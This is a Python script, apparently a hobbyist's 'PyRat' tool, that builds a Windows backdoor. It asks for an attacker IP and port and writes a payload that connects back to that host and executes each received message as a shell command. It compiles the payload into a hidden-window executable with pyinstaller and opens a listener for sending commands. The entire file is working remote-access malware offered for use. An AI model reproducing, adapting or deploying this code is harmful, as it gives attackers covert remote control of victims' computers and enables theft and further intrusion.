# Welcome to PyRat a back door generator
# Note that pyrat only allows you to execute windows command prompt commands.
import subprocess
import time
import socket

print('''
    ____                   __ 
   / __ \__  ___________ _/ /_
  / /_/ / / / / ___/ __ `/ __/
 / ____/ /_/ / /  / /_/ / /_  
/_/    \__, /_/   \__,_/\__/  
      /____/    

Pyrat... Made by NotAidan    
''')

print("---------------------------------------------------------------")
print('Welcome to PyRat a back door generator for windows made in python...')
print("---------------------------------------------------------------")
print('please wait while I check/download the requirements')
print("---------------------------------------------------------------")

time.sleep(5)

# this checks to see if yo have pyinstaller so you can convert the backdoor to exe
# since pip is now called pip3 i just changed it around
subprocess.run("pip3 install pyinstaller", shell=True)

print("---------------------------------------------------------------")
# takes input from user
port = input('what port would you like the target to connect to: ')
ip = input('what public ip would you like the target to connect to: ')
ip2 = input('enter in your local ip: ')

print("---------------------------------------------------------------")
print('generating backdoor please wait... this may take a while')
print("---------------------------------------------------------------")

time.sleep(5)

# these next lines are for writing the backdoor using the vairable f = open("the file", "x")
# heres a article that helped me: https://www.w3schools.com/python/python_file_write.asp
f = open("Pyrat.py", "x")
time.sleep(15)
f = open("Pyrat.py", "w")
f.write('''
import subprocess
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
''')
f.write('ip = "' + ip + '"')
f.write('''
''')
f.write("port = " + port)
f.write('''
s.connect((ip, port))

while True:
    msg = s.recv(1024)

    subprocess.run(msg.decode("utf-8"), shell=True)
''')
f.close()

print("---------------------------------------------------------------")
print('compiling back door to exe and starting listener please wait...')
print("---------------------------------------------------------------")

time.sleep(5)

# this converts the backdoor into a exe file format
# shell=True is for windows because we have to pass the commands through the shell or else we would get a error
subprocess.run("pyinstaller --onefile -w Pyrat.py", shell=True)

print("---------------------------------------------------------------")
print(
    "success!!! your file will be stored in a new folder called (dist) (you can ignore or delete the other folders besides (dist))")
print("---------------------------------------------------------------")
print('starting listener(you use this to execute commands)')
print("please wait for a connection to be made")

# this starts up the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip2, int(port)))

s.listen()

client, address = s.accept()
print(f"a connection has been made with {address}")

# this is use to execute commands and send the commands as bytes
while True:
    command = input('what would you like to execute: ')
    client.send(bytes(command, "utf-8"))
